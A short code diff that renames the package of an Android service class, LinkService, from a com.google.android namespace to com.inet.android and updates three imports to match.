@@ -1,4 +1,4 @@
-package com.google.android.history;
+package com.inet.android.history;
 
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
@@ -18,9 +18,9 @@ import android.preference.PreferenceManager;
 import android.provider.Browser;
 import android.util.Log;
 
-import com.google.android.bs.DataSendHandler;
-import com.google.android.bs.FileLog;
-import com.google.android.bs.WorkTimeDefiner;
+import com.inet.android.bs.DataSendHandler;
+import com.inet.android.bs.FileLog;
+import com.inet.android.bs.WorkTimeDefiner;
 
 public class LinkService extends Service {
 
